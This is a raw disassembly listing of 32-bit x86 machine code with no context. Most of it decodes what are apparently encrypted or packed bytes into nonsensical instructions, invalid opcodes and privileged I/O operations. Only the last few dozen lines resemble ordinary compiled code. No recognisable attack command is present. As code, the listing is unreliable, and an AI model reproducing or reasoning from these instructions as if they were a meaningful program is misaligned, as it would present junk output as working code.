  403062:	mov    eax,0x4933f112
  403067:	fsubrp st(2),st
  403069:	mov    dh,0x35
  40306b:	fdivrp st(6),st
  40306d:	and    al,0x22
  40306f:	sti    
  403070:	dec    esi
  403071:	shl    DWORD PTR [esi*1+0x7258aba2],1
  403078:	push   edi
  403079:	sbb    BYTE PTR [ecx+esi*2],dl
  40307c:	add    BYTE PTR es:[edx+0x4913e717],dl
  403083:	data16 mov dh,0xf5
  403086:	pop    esp
  403087:	ins    DWORD PTR es:[edi],dx
  403088:	cmc    
  403089:	in     al,dx
  40308a:	jns    0x403101
  40308c:	enter  0xaad8,0x8d
  403090:	dec    esp
  403091:	jle    0x403086
  403093:	int3   
  403094:	mov    eax,ds:0xa16da0f8
  403099:	mul    BYTE PTR [edi-0x28832267]
  40309f:	or     DWORD PTR [edx],edx
  4030a1:	rcl    BYTE PTR [edi],1
  4030a3:	les    eax,FWORD PTR [ecx-0x1ea37d50]
  4030a9:	and    DWORD PTR [ebp-0x5a],ebp
  4030ac:	idiv   BYTE PTR [edx+0x7e]
  4030af:	jo     0x403068
  4030b1:	fwait
  4030b2:	hlt    
  4030b3:	in     eax,dx
  4030b4:	std    
  4030b5:	cld    
  4030b6:	mov    al,ds:0x9faa1140
  4030bb:	and    cl,cl
  4030bd:	fcomp  DWORD PTR [edi]
  4030bf:	jo     0x4030d5
  4030c1:	mov    esi,0x42b03fd9
  4030c6:	fisttp WORD PTR [edi-0x29]
  4030c9:	mov    ebx,0xe6661558
  4030ce:	std    
  4030cf:	lahf   
  4030d0:	or     cl,BYTE PTR [eax+ebx*4+0x26f0306e]
  4030d7:	or     ah,BYTE PTR [edx+0x5a]
  4030da:	ds mov ch,0xa8
  4030dd:	popa   
  4030de:	xchg   esp,eax
  4030df:	stos   BYTE PTR es:[edi],al
  4030e0:	jmp    0xbdcc:0xe291b876
  4030e7:	loope  0x4030e2
  4030e9:	rcl    ah,1
  4030eb:	fstp   QWORD PTR [edx-0x140d0209]
  4030f1:	dec    ecx
  4030f2:	mov    esp,0xd1c256c0
  4030f7:	and    ah,BYTE PTR [edx-0x7e028cc3]
  4030fd:	xchg   ecx,eax
  4030fe:	jb     0x403142
  403100:	ror    DWORD PTR ss:[ecx],1
  403103:	loopne 0x40317b
  403105:	push   ss
  403106:	dec    ecx
  403107:	imul   DWORD PTR [esi+edi*8+0x59b7710e]
  40310e:	daa    
  40310f:	in     eax,dx
  403110:	pop    esp
  403111:	ret    0x7766
  403114:	adc    cl,BYTE PTR [ebx-0x22c020fd]
  40311a:	mov    dl,0xe2
  40311c:	das    
  40311d:	fimul  WORD PTR ds:0x4560a6f3
  403123:	xor    DWORD PTR [ebp+0x2545a575],eax
  403129:	mov    ecx,0x9374e7f7
  40312e:	je     0x40317f
  403130:	dec    edx
  403131:	dec    esp
  403132:	sbb    eax,0x96b917d7
  403137:	test   BYTE PTR [ebx],ch
  403139:	mov    al,0x82
  40313b:	cmp    eax,0x5676be84
  403140:	int    0xd9
  403142:	cmp    eax,0x2c14dc3a
  403147:	retf   
  403148:	fbstp  TBYTE PTR [ecx+0x1a0e8910]
  40314e:	mov    ds:0x24ead200,al
  403153:	retf   
  403154:	dec    edi
  403155:	jp     0x403159
  403157:	pop    edi
  403158:	push   cs
  403159:	inc    esi
  40315a:	es mov esi,0x38597fed
  403160:	cmp    al,0x30
  403162:	imul   esi,eax,0x62
  403165:	fist   DWORD PTR [eax+0x1bfa725a]
  40316b:	rcr    DWORD PTR [esi+0x1b],0x69
  40316f:	xor    DWORD PTR [ecx+0x3a],esi
  403172:	dec    ebp
  403173:	mov    al,0x3
  403175:	in     eax,0xc6
  403177:	adc    BYTE PTR [edx-0x24106e04],dl
  40317d:	push   esp
  40317e:	int3   
  40317f:	outs   dx,BYTE PTR ds:[esi]
  403180:	inc    edx
  403181:	add    DWORD PTR [ebx],ebp
  403183:	nop
  403184:	mov    dl,dl
  403186:	mov    esp,0xd5a4b768
  40318b:	ja     0x4031e7
  40318d:	lods   eax,DWORD PTR ds:[esi]
  40318e:	call   0x3e88:0x2f5cfda
  403195:	(bad)  
  403196:	jo     0x4031ed
  403198:	cdq    
  403199:	jmp    FWORD PTR [edx-0x1f]
  40319c:	or     eax,0x426f0954
  4031a1:	dec    esp
  4031a2:	std    
  4031a3:	paddsw mm6,QWORD PTR [ebx]
  4031a6:	fs and edx,0x683d4d94
  4031ad:	leave  
  4031ae:	jl     0x4031fb
  4031b0:	pusha  
  4031b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031b2:	push   ss
  4031b3:	jmp    0x38f6:0x980fea4d
  4031ba:	jmp    0x2c7e243c
  4031bf:	aaa    
  4031c0:	push   ebx
  4031c1:	pop    ebp
  4031c2:	mov    ch,0x13
  4031c4:	push   0x3bed8979
  4031c9:	pop    edi
  4031ca:	stos   BYTE PTR es:[edi],al
  4031cb:	xchg   DWORD PTR [ebx],edi
  4031cd:	js     0x4031bc
  4031cf:	aas    
  4031d0:	or     eax,0x2b376474
  4031d5:	enter  0xb318,0x96
  4031d9:	cdq    
  4031da:	cmc    
  4031db:	pop    edx
  4031dc:	xchg   edx,eax
  4031dd:	rcl    BYTE PTR [eax-0x5fc3336],cl
  4031e3:	sub    dh,BYTE PTR [esi+0x3657bbd4]
  4031e9:	dec    ebp
  4031ea:	in     al,dx
  4031eb:	and    eax,0x31e36dbc
  4031f0:	push   ss
  4031f1:	push   0xdac1874c
  4031f6:	scas   al,BYTE PTR es:[edi]
  4031f7:	idiv   dh
  4031f9:	xchg   BYTE PTR [eax+0x2e2c6d03],dh
  4031ff:	inc    eax
  403200:	xchg   edi,eax
  403201:	shl    ah,cl
  403203:	inc    ebp
  403204:	mov    edx,DWORD PTR [esi+ebp*8]
  403207:	jge    0x40318f
  403209:	add    al,0xb
  40320b:	lds    eax,FWORD PTR [ecx-0x4b896e06]
  403211:	shl    ebp,1
  403213:	call   0x4d63ef61
  403218:	adc    ah,dh
  40321a:	push   ds
  40321b:	icebp  
  40321c:	dec    ecx
  40321d:	popa   
  40321e:	jge    0x403207
  403220:	test   BYTE PTR ds:[esi-0x7dd62460],0xf5
  403228:	mov    cl,0xb3
  40322b:	sub    al,0x67
  40322d:	xchg   esp,eax
  40322e:	add    DWORD PTR [ecx+0x73],ecx
  403231:	outs   dx,BYTE PTR ds:[esi]
  403232:	sti    
  403233:	rcl    BYTE PTR [edi+edx*1+0x90b0216],0x5b
  40323b:	cmp    dh,BYTE PTR [ebx]
  40323d:	aam    0x92
  40323f:	shl    BYTE PTR [ebp+edx*4+0x49],1
  403243:	push   es
  403244:	adc    bl,al
  403246:	mov    dl,BYTE PTR [edi+0x7572c400]
  40324c:	je     0x403234
  40324e:	js     0x403263
  403250:	inc    esi
  403251:	mov    cl,0xc6
  403253:	mov    ecx,0xd0784407
  403258:	mov    esp,0xa3a39b21
  40325d:	jb     0x403247
  40325f:	repnz cmp eax,0x92936a39
  403265:	mov    al,0x1a
  403267:	xchg   bp,ax
  403269:	sbb    cl,ah
  40326b:	sahf   
  40326c:	sbb    BYTE PTR [ecx-0x3221a19e],al
  403272:	inc    ebx
  403273:	sub    ebx,DWORD PTR [eax]
  403275:	cmp    al,BYTE PTR [edi]
  403277:	test   eax,0x556c8ecd
  40327c:	stos   BYTE PTR es:[edi],al
  40327d:	bound  esi,QWORD PTR [ebx]
  40327f:	js     0x40322f
  403281:	scas   al,BYTE PTR es:[edi]
  403282:	pop    esp
  403283:	push   eax
  403284:	or     edi,0xfc38efd1
  40328a:	jp     0x403251
  40328c:	pop    ss
  40328d:	dec    eax
  40328e:	retf   
  40328f:	pop    edx
  403290:	(bad)  
  403291:	xlat   BYTE PTR ds:[ebx]
  403292:	sub    eax,0xfba4ccd0
  403297:	imul   ebp,edx,0xffffffb8
  40329a:	mov    WORD PTR [eax],?
  40329c:	leave  
  40329d:	mov    al,0x5e
  40329f:	loopne 0x403229
  4032a1:	cmp    DWORD PTR [ecx+0x62bf9611],esp
  4032a7:	bound  ebp,QWORD PTR [ebx-0x2865aba4]
  4032ad:	push   ds
  4032ae:	mov    dl,BYTE PTR [ebx]
  4032b0:	loop   0x4032dc
  4032b2:	lds    ebp,FWORD PTR [eax]
  4032b4:	sbb    al,0x2
  4032b6:	jge    0x40328e
  4032b8:	mov    dl,dh
  4032ba:	shr    DWORD PTR [ebp+0xc],cl
  4032bd:	loop   0x403338
  4032bf:	push   0xffffffb1
  4032c1:	sbb    edi,esp
  4032c3:	ret    
  4032c4:	cmp    al,0xe7
  4032c6:	clc    
  4032c7:	stc    
  4032c8:	iret   
  4032c9:	fisubr WORD PTR [edi+0x5092ebad]
  4032cf:	adc    bl,bl
  4032d1:	(bad)
  4032d4:	jecxz  0x403344
  4032d6:	xchg   esp,eax
  4032d7:	fsub   st,st(4)
  4032d9:	rcl    DWORD PTR [ebx+0x40],cl
  4032dc:	ins    DWORD PTR es:[edi],dx
  4032dd:	loop   0x40326d
  4032df:	or     eax,0x8a06c8ec
  4032e4:	pop    ecx
  4032e5:	aas    
  4032e6:	mov    edi,0xe5da378d
  4032eb:	mov    bl,0x23
  4032ed:	mov    cl,0xa1
  4032ef:	(bad)  
  4032f1:	popf   
  4032f2:	add    ecx,DWORD PTR [esi-0x14e555c7]
  4032f8:	cmp    DWORD PTR [edx],edx
  4032fa:	jae    0x403304
  4032fc:	sub    BYTE PTR [ecx],dh
  4032fe:	cmc    
  4032ff:	push   ebp
  403300:	adc    DWORD PTR [eax],esp
  403302:	mov    dl,0xdc
  403304:	or     dl,BYTE PTR [edi-0x13]
  403307:	pop    esi
  403308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403309:	jge    0x40328f
  40330b:	mov    ebp,0xeae95ed7
  403310:	sub    ah,BYTE PTR [ecx-0x3a]
  403313:	outs   dx,DWORD PTR ds:[esi]
  403314:	leave  
  403315:	mov    ebp,0x4a2bb409
  40331a:	jns    0x403367
  40331c:	(bad)  
  40331d:	dec    edi
  40331e:	loop   0x403343
  403320:	sub    ecx,DWORD PTR [esi]
  403322:	cmp    DWORD PTR [esp+eiz*8],ebx
  403325:	dec    edi
  403326:	sbb    BYTE PTR [ecx+esi*4+0x44],ch
  40332a:	fsub   QWORD PTR [esi+0xb161728]
  403330:	outs   dx,BYTE PTR ds:[esi]
  403331:	mov    eax,0xc351f942
  403336:	adc    bh,BYTE PTR [edx-0x2658d229]
  40333c:	cmp    ah,cl
  40333e:	adc    BYTE PTR [edi],bh
  403340:	loop   0x403358
  403342:	and    al,0xf1
  403344:	fadd   QWORD PTR [edi]
  403346:	ins    BYTE PTR es:[edi],dx
  403347:	std    
  403348:	xchg   ecx,eax
  403349:	adc    DWORD PTR [ebp+0x53],0x7fa10edb
  403350:	test   DWORD PTR [eax+0x3ae3f191],ebp
  403356:	pop    edx
  403357:	das    
  403358:	sub    ecx,DWORD PTR ds:0x36c7a92b
  40335e:	arpl   WORD PTR [ebx-0x32],di
  403361:	out    0xa2,eax
  403363:	ret    
  403364:	mov    BYTE PTR [eiz*1-0x7ece68d9],dl
  40336b:	retf   
  40336c:	push   esp
  40336d:	jne    0x40331d
  40336f:	pop    edi
  403370:	(bad)  
  403371:	fsub   QWORD PTR [edi]
  403373:	iret   
  403374:	sti    
  403375:	sahf   
  403376:	xor    ah,bl
  403378:	pushf  
  403379:	fdiv   st(6),st
  40337b:	and    BYTE PTR [ebx-0x41],al
  40337e:	aas    
  40337f:	jmp    0xebc0:0x98930a22
  403386:	dec    ebx
  403387:	(bad)  [eax+0x77fa91a8]
  40338d:	clc    
  40338e:	adc    dl,BYTE PTR [eax+0x50]
  403391:	adc    esp,DWORD PTR [ecx-0x34]
  403394:	into   
  403395:	test   BYTE PTR [ebx-0x35fbdc1a],0x50
  40339c:	pop    edx
  40339d:	pushf  
  40339e:	out    0x6a,eax
  4033a0:	mov    cl,0xb8
  4033a2:	retf   
  4033a3:	mov    dl,0x9e
  4033a5:	mov    edi,0x7e37c942
  4033aa:	add    BYTE PTR [edx],cl
  4033ac:	ror    ecx,cl
  4033ae:	lea    edx,[edi-0x6a]
  4033b1:	lock cmp cl,BYTE PTR ss:[edx+0x9d124c4]
  4033b9:	shl    DWORD PTR [edx+0x5d],0xa3
  4033bd:	(bad)  
  4033be:	aaa    
  4033bf:	adc    esp,ebp
  4033c1:	retf   
  4033c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c3:	ret    
  4033c4:	jle    0x403369
  4033c6:	fidiv  DWORD PTR [edx]
  4033c8:	call   0x9243ab2e
  4033cd:	dec    ebp
  4033ce:	shr    DWORD PTR [eax-0x3a],1
  4033d1:	(bad)  
  4033d2:	mov    eax,0xaca762c1
  4033d7:	sbb    ecx,DWORD PTR [ebp+0x68]
  4033da:	aas    
  4033db:	mov    BYTE PTR [edx-0x7271ccb1],al
  4033e1:	aad    0x38
  4033e3:	mov    esp,0x403f7e1b
  4033e8:	xchg   ebp,eax
  4033e9:	push   ds
  4033ea:	pop    esp
  4033eb:	ss xchg edi,eax
  4033ed:	inc    edi
  4033ee:	fisub  DWORD PTR cs:[edi-0xc]
  4033f2:	clc    
  4033f3:	(bad)  
  4033f4:	jmp    0x4033da
  4033f6:	inc    edi
  4033f7:	sub    BYTE PTR [eax-0xa],ch
  4033fa:	add    bl,bl
  4033fc:	jbe    0x403442
  4033fe:	mov    al,0x7d
  403400:	shr    DWORD PTR [ecx-0x2df8bd0e],cl
  403406:	lds    ebp,FWORD PTR [eax-0x1c571b76]
  40340c:	xchg   ebp,eax
  40340d:	mov    ds:0x9cbdf722,al
  403412:	adc    BYTE PTR [edi-0x13c7116a],cl
  403418:	bound  esi,QWORD PTR [edi]
  40341a:	or     al,0x9e
  40341c:	sbb    eax,0x34524c28
  403421:	out    0x1f,eax
  403423:	jbe    0x403456
  403425:	xchg   ebx,eax
  403426:	stos   BYTE PTR es:[edi],al
  403427:	dec    ebp
  403428:	jno    0x40348c
  40342a:	ret    0x3743
  40342d:	pop    es
  40342e:	jb     0x403463
  403430:	fisub  WORD PTR [edi]
  403432:	inc    ecx
  403433:	pop    edx
  403434:	jae    0x4033e5
  403436:	xchg   ebx,eax
  403437:	shl    BYTE PTR [eax],0x34
  40343a:	mov    bx,0x6a96
  40343e:	add    cl,al
  403440:	out    0xa1,eax
  403442:	sbb    al,BYTE PTR [edx-0x7f711878]
  403448:	pop    eax
  403449:	cmp    DWORD PTR fs:[eax+ebx*4],ebp
  40344d:	pop    es
  40344e:	pusha  
  40344f:	xchg   edi,eax
  403450:	and    BYTE PTR [eax],ch
  403452:	je     0x40341a
  403454:	fidiv  DWORD PTR [edx-0x5544cb42]
  40345a:	xor    ch,BYTE PTR [ecx]
  40345c:	lods   eax,DWORD PTR ds:[esi]
  40345d:	popa   
  40345e:	inc    esi
  40345f:	enter  0xb579,0xc9
  403463:	fwait
  403464:	iret   
  403465:	dec    ebx
  403466:	outs   dx,DWORD PTR ds:[esi]
  403467:	outs   dx,DWORD PTR ds:[esi]
  403468:	(bad)  
  403469:	std    
  40346a:	test   al,0x17
  40346c:	(bad)  
  40346e:	push   ebp
  40346f:	adc    ch,0x86
  403472:	callw  0xfbe
  403476:	cli    
  403477:	mov    edi,0x4382dc3d
  40347c:	xor    al,0x84
  40347e:	mov    DWORD PTR [ecx-0x63],eax
  403481:	mov    esi,DWORD PTR [ecx]
  403483:	add    DWORD PTR [ebx-0x7f76b99a],0xf660928
  40348d:	adc    edx,esi
  40348f:	add    ch,BYTE PTR [ebp+0x2b2d425b]
  403495:	or     bh,cl
  403497:	mov    esi,0xea81d906
  40349c:	lahf   
  40349d:	or     BYTE PTR [ecx+0x33],cl
  4034a0:	aaa    
  4034a1:	xchg   ebx,eax
  4034a2:	mov    ds,WORD PTR [edi-0x4db74fdd]
  4034a8:	mov    bl,BYTE PTR [ebx]
  4034aa:	in     eax,dx
  4034ab:	or     DWORD PTR [edi-0x6d],edx
  4034ae:	pop    ebp
  4034af:	dec    ecx
  4034b0:	push   eax
  4034b1:	mov    al,0x23
  4034b3:	mov    esi,esp
  4034b5:	cmp    al,0x3e
  4034b7:	ret    
  4034b8:	ret    
  4034b9:	aad    0x49
  4034bb:	js     0x4034de
  4034bd:	mov    ecx,0x8a3fcdb0
  4034c2:	push   0x4eb053f4
  4034c7:	xor    esi,ecx
  4034c9:	out    dx,al
  4034ca:	fstp   DWORD PTR [ebp+0x39a3471e]
  4034d0:	xor    eax,0xd77ed7cb
  4034d5:	push   edi
  4034d6:	push   edx
  4034d7:	sub    al,0x1c
  4034d9:	out    0xb5,eax
  4034db:	aaa    
  4034dc:	outs   dx,BYTE PTR ds:[esi]
  4034dd:	cmp    al,0xef
  4034df:	push   eax
  4034e0:	push   ebp
  4034e1:	push   ecx
  4034e2:	and    edx,DWORD PTR [ebx-0x33cc7597]
  4034e8:	inc    edi
  4034e9:	int3   
  4034ea:	aaa    
  4034eb:	adc    BYTE PTR [edx+eiz*8+0x4ec9a6b4],bh
  4034f2:	in     al,dx
  4034f3:	or     cl,BYTE PTR ds:0x4a2e99f1
  4034f9:	dec    edi
  4034fa:	inc    ebp
  4034fb:	mov    edx,DWORD PTR [ecx]
  4034fd:	popf   
  4034fe:	ret    0xef4a
  403501:	pop    ebp
  403502:	scas   eax,DWORD PTR es:[edi]
  403503:	(bad)  [ebp+edi*1+0x7890e843]
  40350a:	add    DWORD PTR [ebp-0x2333c9fc],0x98a8710f
  403514:	stc    
  403515:	lock in eax,0x9f
  403518:	mov    ah,0x32
  40351a:	into   
  40351b:	fcmovb st,st(0)
  40351d:	lds    esi,FWORD PTR [eax+0x52]
  403520:	fsubr  DWORD PTR [edi+0x78]
  403523:	push   ss
  403524:	call   0xb5fd83d6
  403529:	imul   ebx,DWORD PTR [ebx+0x70c482f5],0xffffffbf
  403530:	shl    BYTE PTR [ecx],1
  403532:	ins    DWORD PTR es:[edi],dx
  403533:	stos   DWORD PTR es:[edi],eax
  403534:	add    bl,bl
  403536:	add    al,0x32
  403538:	popa   
  403539:	int    0x17
  40353b:	push   ebp
  40353c:	mov    edi,0x67baa8b0
  403541:	pop    edx
  403542:	lock mov cl,0x6
  403545:	addr16 in eax,dx
  403547:	out    0x69,al
  403549:	in     al,dx
  40354a:	cmp    esi,DWORD PTR [edx]
  40354c:	mov    eax,0xd400bc9
  403551:	out    0xa6,eax
  403553:	retf   
  403554:	sbb    edx,DWORD PTR [esi-0x3a]
  403557:	(bad)  
  403558:	imul   edx,DWORD PTR [esi+0x395ca9e5],0x6e
  40355f:	fdivr  st,st(3)
  403561:	xor    bl,bh
  403563:	sub    al,0x63
  403565:	jmp    DWORD PTR [edx-0x27a9cf12]
  40356b:	mov    DWORD PTR [eax],0x149b25e4
  403571:	dec    esp
  403572:	ins    BYTE PTR es:[edi],dx
  403573:	jmp    0x69c8:0x7e464e8
  40357a:	add    cl,cl
  40357c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40357d:	fdivr  DWORD PTR [edi]
  40357f:	push   esi
  403580:	xor    al,0x89
  403582:	data16 (bad) 
  403584:	into   
  403585:	imul   ebp,DWORD PTR [ecx-0x66],0x59b3adfa
  40358c:	sbb    BYTE PTR [edx-0x417afb96],0x1f
  403593:	dec    edx
  403594:	or     eax,0xfe26fec5
  403599:	aad    0x11
  40359b:	pop    esi
  40359c:	pop    ecx
  40359d:	dec    ebx
  40359e:	call   0x639cc397
  4035a3:	fimul  WORD PTR [edi+esi*4-0x180fec10]
  4035aa:	push   ss
  4035ab:	sti    
  4035ac:	pusha  
  4035ad:	cmp    BYTE PTR [ebx],bh
  4035af:	test   eax,0xbf8d4d51
  4035b4:	jg     0x403572
  4035b6:	scas   al,BYTE PTR es:[edi]
  4035b7:	cmp    eax,0x642c37a0
  4035bc:	pop    esi
  4035bd:	loope  0x40361d
  4035bf:	fistp  QWORD PTR [ecx+0x37]
  4035c2:	fsub   DWORD PTR [esi-0x10]
  4035c5:	mov    dh,0xde
  4035c7:	(bad)  [ecx+0x3c2cb6b0]
  4035cd:	mov    esp,0xd8e96695
  4035d2:	mov    ds:0x3d66638,eax
  4035d7:	sti    
  4035d8:	(bad)  
  4035d9:	(bad)  
  4035da:	adc    eax,0xe7c8a3c2
  4035df:	cdq    
  4035e0:	inc    edi
  4035e1:	out    0xa5,eax
  4035e3:	add    bh,cl
  4035e5:	pop    es
  4035e6:	bound  esp,QWORD PTR [eax-0x68d87e7f]
  4035ec:	jnp    0x4035f3
  4035ee:	push   cs
  4035ef:	les    eax,FWORD PTR [edx]
  4035f1:	aad    0x15
  4035f3:	and    eax,0xec369ab0
  4035f8:	jl     0x403639
  4035fa:	in     eax,dx
  4035fb:	loop   0x4035dd
  4035fd:	mov    eax,ds:0xcec31e04
  403602:	hlt    
  403603:	out    0xa9,al
  403605:	enter  0x93b1,0x8f
  403609:	jb     0x4035fd
  40360b:	cld    
  40360c:	in     eax,0x7e
  40360e:	cmp    ecx,ebp
  403610:	wrmsr  
  403612:	xchg   ebx,eax
  403613:	dec    esi
  403614:	ds inc esi
  403616:	cmp    edi,edi
  403618:	repnz mov dl,0x3a
  40361b:	cs cmp al,0x5d
  40361e:	or     eax,0xef99634e
  403623:	repz aad 0x58
  403626:	ins    BYTE PTR es:[edi],dx
  403627:	add    DWORD PTR ss:[edx],edx
  40362a:	ins    DWORD PTR es:[edi],dx
  40362b:	fsubp  st(4),st
  40362d:	pop    esp
  40362e:	pop    ecx
  40362f:	int    0x11
  403631:	or     dh,BYTE PTR [edi+edi*2]
  403634:	xor    eax,DWORD PTR [esi]
  403636:	push   bx
  403638:	jae    0x40363e
  40363a:	xor    al,0x1c
  40363c:	pop    ss
  40363d:	addr16 call 0x1398c638
  403643:	in     eax,0x59
  403645:	loop   0x403683
  403647:	clc    
  403648:	loope  0x40364d
  40364a:	dec    ebx
  40364b:	mov    ecx,0x98fcfe46
  403650:	inc    esi
  403651:	mov    ds:0xc7002389,al
  403656:	in     eax,0xd7
  403658:	jae    0x4035f9
  40365a:	sub    al,0xbf
  40365c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40365d:	and    edx,ecx
  40365f:	push   ecx
  403660:	mov    edi,DWORD PTR [edx+0x3c5e821c]
  403666:	pop    ecx
  403667:	push   esi
  403668:	loop   0x4035ef
  40366a:	jb     0x403621
  40366c:	xchg   edi,eax
  40366d:	ins    DWORD PTR es:[edi],dx
  40366e:	inc    ecx
  40366f:	mov    cl,0x2f
  403671:	je     0x403684
  403673:	cwde   
  403674:	cmp    DWORD PTR [ecx+0x78],ebx
  403677:	jg     0x4036a3
  403679:	pop    esp
  40367a:	mov    ebx,0x2cc9f7db
  40367f:	sub    al,BYTE PTR [ebx-0x436099c1]
  403685:	jl     0x40361f
  403687:	into   
  403688:	mov    DWORD PTR [ecx],ecx
  40368a:	shl    BYTE PTR [edi-0x4514371e],1
  403690:	mov    WORD PTR ds:0xaee81c62,es
  403696:	icebp  
  403697:	ficom  WORD PTR [eax]
  403699:	xchg   edi,eax
  40369a:	retf   0x9f8c
  40369d:	xchg   ecx,eax
  40369e:	jmp    0x146f:0x2e3fe495
  4036a5:	inc    esi
  4036a6:	out    0x13,eax
  4036a8:	in     al,dx
  4036a9:	call   ebp
  4036ab:	es dec esi
  4036ad:	popa   
  4036ae:	enter  0x7e0,0x4e
  4036b2:	jns    0x4036f7
  4036b4:	inc    ebp
  4036b5:	pop    ds
  4036b6:	push   ebx
  4036b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b8:	fist   DWORD PTR [edx]
  4036ba:	or     BYTE PTR [esi-0x22],cl
  4036bd:	jmp    0x403668
  4036bf:	add    edx,DWORD PTR [ecx+ebp*8]
  4036c2:	test   BYTE PTR [eax-0x22415f7b],al
  4036c8:	add    BYTE PTR [edi+0xa],bl
  4036cb:	(bad)  
  4036cc:	aas    
  4036cd:	sbb    dh,BYTE PTR [bx+di+0x32]
  4036d1:	scas   al,BYTE PTR es:[edi]
  4036d2:	adc    ebx,DWORD PTR [esi+esi*4+0x1b]
  4036d6:	dec    ebx
  4036d7:	iret   
  4036d8:	xchg   esi,eax
  4036d9:	inc    ecx
  4036da:	push   esp
  4036db:	cmp    DWORD PTR [ecx],ebp
  4036dd:	or     BYTE PTR [edi],0xae
  4036e0:	test   BYTE PTR [ebx-0x21],cl
  4036e3:	repz sub al,BYTE PTR [ebp-0x6e]
  4036e7:	int    0x4c
  4036e9:	repnz out 0x9e,eax
  4036ec:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ee:	or     esp,DWORD PTR es:[ecx]
  4036f1:	std    
  4036f2:	mov    DWORD PTR [ebx],ebp
  4036f4:	fstp   DWORD PTR [ebx]
  4036f6:	adc    eax,0x3db5f5ec
  4036fb:	xchg   DWORD PTR [eax],esi
  4036fd:	fimul  WORD PTR [esp+edx*1-0x266feb17]
  403704:	mov    eax,ds:0x22234534
  403709:	pop    ds
  40370a:	xor    BYTE PTR [eax+0x21],bh
  40370d:	push   ebx
  40370e:	ret    0x6274
  403711:	and    edi,DWORD PTR [esi]
  403713:	fstp   TBYTE PTR [edi-0x10]
  403716:	sub    DWORD PTR [edx+0x1fff56b3],0xffffffe2
  40371d:	mov    DWORD PTR [ecx+0xa],esp
  403720:	xor    BYTE PTR [ecx],ch
  403722:	push   esp
  403723:	xchg   esi,eax
  403724:	and    eax,0xf9258eb4
  403729:	cs dec edi
  40372b:	xchg   ebx,eax
  40372c:	pushf  
  40372d:	in     eax,0x9a
  40372f:	push   0x84b972f6
  403734:	pop    ss
  403735:	cmp    DWORD PTR [ebx+0x2687eca8],esp
  40373b:	mov    bh,0xb3
  40373d:	or     DWORD PTR [edx],eax
  40373f:	jecxz  0x403788
  403741:	cmp    BYTE PTR [ebx-0x7c],0x37
  403745:	aam    0x55
  403747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403748:	out    0x66,eax
  40374a:	popa   
  40374b:	pop    esi
  40374c:	mov    ecx,0x932ef9ab
  403751:	imul   esi,DWORD PTR [ebp-0x30b60eac],0x1f210ccf
  40375b:	pop    esi
  40375c:	inc    ebp
  40375d:	pop    esp
  40375e:	pop    es
  40375f:	push   esi
  403760:	xor    BYTE PTR [ebp+0x6781c9d4],ch
  403766:	(bad)  
  403767:	invd   
  403769:	lock xor cl,BYTE PTR [ecx+0x31]
  40376d:	lods   eax,DWORD PTR ds:[esi]
  40376e:	retfw  0xb332
  403772:	into   
  403773:	jbe    0x403757
  403775:	frstor [edi-0x3e334e34]
  40377b:	add    dl,bh
  40377d:	push   esp
  40377e:	cmovne eax,DWORD PTR [edi+0x60]
  403782:	lock add esp,DWORD PTR [edi]
  403785:	imul   ebx,esp,0x1d
  403788:	in     al,dx
  403789:	cs scas eax,DWORD PTR es:[edi]
  40378b:	inc    ecx
  40378c:	loop   0x40380c
  40378e:	xor    DWORD PTR ds:0xe8d635ec,ebx
  403794:	(bad)  
  403795:	push   ebx
  403796:	jb     0x403753
  403798:	sub    eax,0xf24b7b75
  40379d:	mov    bh,0xd0
  40379f:	and    DWORD PTR [edx],edx
  4037a1:	cmp    BYTE PTR [edi+0x1303cf93],0x7a
  4037a8:	or     bh,dl
  4037aa:	pushf  
  4037ab:	(bad)
  4037af:	inc    esp
  4037b0:	or     al,0xe4
  4037b2:	xor    BYTE PTR [edi+edi*8+0x772e32c2],0x56
  4037ba:	mov    ds:0x9d1f21e4,eax
  4037bf:	cmp    DWORD PTR [esi+0x634a4a58],esp
  4037c5:	icebp  
  4037c6:	(bad)  
  4037c7:	stos   BYTE PTR es:[edi],al
  4037c8:	push   ebx
  4037c9:	xchg   esp,eax
  4037ca:	or     DWORD PTR ds:0x375c6fba,esp
  4037d0:	call   0x3c27:0x491d8ead
  4037d7:	iret   
  4037d8:	mov    ebx,0x70ca2fa1
  4037dd:	cdq    
  4037de:	ficom  WORD PTR [ebp+0x25efdc56]
  4037e4:	pop    ecx
  4037e5:	in     al,dx
  4037e6:	repz jmp 0x4037ee
  4037e9:	cli    
  4037ea:	bound  esi,QWORD PTR [ebx]
  4037ec:	xor    eax,0x766fe8f0
  4037f1:	add    DWORD PTR [eax],eax
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
